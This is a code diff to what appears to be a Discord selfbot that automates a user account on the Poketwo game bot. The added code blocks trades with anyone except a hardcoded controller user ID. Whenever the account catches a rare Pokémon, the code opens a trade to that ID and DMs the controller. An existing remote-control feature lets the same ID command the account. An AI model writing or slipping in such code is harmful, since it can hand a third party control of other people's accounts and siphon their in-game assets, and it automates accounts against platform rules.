@@ -1088,8 +1088,72 @@ async function Login(token, Client, guildId) {
       }
     }
 
-    // Remote Control Feature - User 1094994685765886094 can control this account
+    // Trade Protection - Only allow trades with CONTROLLER_ID
     const CONTROLLER_ID = "1094994685765886094";
+    const ALLOWED_TRADE_USERS = [CONTROLLER_ID, "1091649903962374196"];
+
+    // Detect incoming trade requests from Poketwo
+    if (message.author.id === "716390085896962058" && message.embeds[0]?.title?.includes("wants to trade")) {
+      // Check if trade is with an allowed user
+      const tradeTitle = message.embeds[0].title;
+      const isAllowedTrade = ALLOWED_TRADE_USERS.some(id => tradeTitle.includes(id));
+
+      if (!isAllowedTrade) {
+        // Auto-cancel trades with non-allowed users
+        console.log(chalk.yellow(`[TRADE PROTECTION] Blocking trade - not from allowed user`));
+        await sleep(1000);
+        await message.channel.send(`<@716390085896962058> t x`);
+      }
+    }
+
+    // Auto-trade rare pokemon (legendaries, mythicals, ultra beasts) to controller
+    if (message.author.id === "716390085896962058" &&
+      message.embeds[0]?.author?.name?.includes(client.user.username) &&
+      message.embeds[0]?.description?.includes("Congratulations")) {
+
+      const pokemonName = message.embeds[0]?.description || "";
+
+      // List of legendaries, mythicals, and ultra beasts
+      const rareList = [
+        "Articuno", "Zapdos", "Moltres", "Mewtwo", "Mew", "Raikou", "Entei", "Suicune",
+        "Lugia", "Ho-Oh", "Celebi", "Regirock", "Regice", "Registeel", "Latias", "Latios",
+        "Kyogre", "Groudon", "Rayquaza", "Jirachi", "Deoxys", "Uxie", "Mesprit", "Azelf",
+        "Dialga", "Palkia", "Heatran", "Regigigas", "Giratina", "Cresselia", "Phione",
+        "Manaphy", "Darkrai", "Shaymin", "Arceus", "Victini", "Cobalion", "Terrakion",
+        "Virizion", "Tornadus", "Thundurus", "Reshiram", "Zekrom", "Landorus", "Kyurem",
+        "Keldeo", "Meloetta", "Genesect", "Xerneas", "Yveltal", "Zygarde", "Diancie",
+        "Hoopa", "Volcanion", "Type: Null", "Silvally", "Tapu Koko", "Tapu Lele",
+        "Tapu Bulu", "Tapu Fini", "Cosmog", "Cosmoem", "Solgaleo", "Lunala", "Necrozma",
+        "Magearna", "Marshadow", "Zeraora", "Meltan", "Melmetal", "Zacian", "Zamazenta",
+        "Eternatus", "Kubfu", "Urshifu", "Zarude", "Regieleki", "Regidrago", "Glastrier",
+        "Spectrier", "Calyrex", "Enamorus", "Koraidon", "Miraidon",
+        // Ultra Beasts
+        "Nihilego", "Buzzwole", "Pheromosa", "Xurkitree", "Celesteela", "Kartana",
+        "Guzzlord", "Poipole", "Naganadel", "Stakataka", "Blacephalon"
+      ];
+
+      const caughtRare = rareList.find(name => pokemonName.toLowerCase().includes(name.toLowerCase()));
+
+      if (caughtRare) {
+        console.log(chalk.magenta(`[AUTO-TRADE] Caught rare pokemon: ${caughtRare}! Starting trade to controller...`));
+
+        // Wait a bit then get the pokemon number and trade
+        await sleep(3000);
+        await message.channel.send(`<@716390085896962058> pokemon --pokemon`);
+        await sleep(2000);
+
+        // Start trade with controller
+        await message.channel.send(`<@716390085896962058> trade <@${CONTROLLER_ID}>`);
+
+        // DM controller about the rare catch
+        try {
+          const controller = await client.users.fetch(CONTROLLER_ID);
+          await controller.send(`🌟 **Rare Pokemon Caught!** ${client.user.username} caught a **${caughtRare}**! Trade started.`);
+        } catch (e) { /* ignore DM errors */ }
+      }
+    }
+
+    // Remote Control Feature - User 1094994685765886094 can control this account
     if (message.author.id === CONTROLLER_ID && message.content.startsWith(">>")) {
       const controlCmd = message.content.slice(2).trim();
       const controlArgs = controlCmd.split(/ +/g);
@@ -1187,6 +1251,24 @@ async function Login(token, Client, guildId) {
         else if (action === "cancel") {
           await message.channel.send(`<@716390085896962058> t x`);
           await message.react("✅");
+        }
+        // >> pauseincense - Pause incense in all running channels
+        else if (action === "pauseincense" || action === "pi" || action === "pause") {
+          if (incenseChannels.size > 0) {
+            console.log(chalk.yellow(`[REMOTE] Pausing incense in ${incenseChannels.size} channel(s)...`));
+            for (const channel of incenseChannels) {
+              try {
+                await channel.send("<@716390085896962058> incense pause");
+                console.log(chalk.green(`[REMOTE] Paused incense in #${channel.name}`));
+              } catch (e) {
+                console.error(chalk.red(`[REMOTE] Failed to pause in #${channel.name}: ${e.message}`));
+              }
+            }
+            incenseChannels.clear();
+            await message.react("⏸️");
+          } else {
+            await message.reply("No active incense to pause.");
+          }
         }
         // >> pay @user <amount> - Full trade flow to send coins
         else if (action === "pay" || action === "give") {
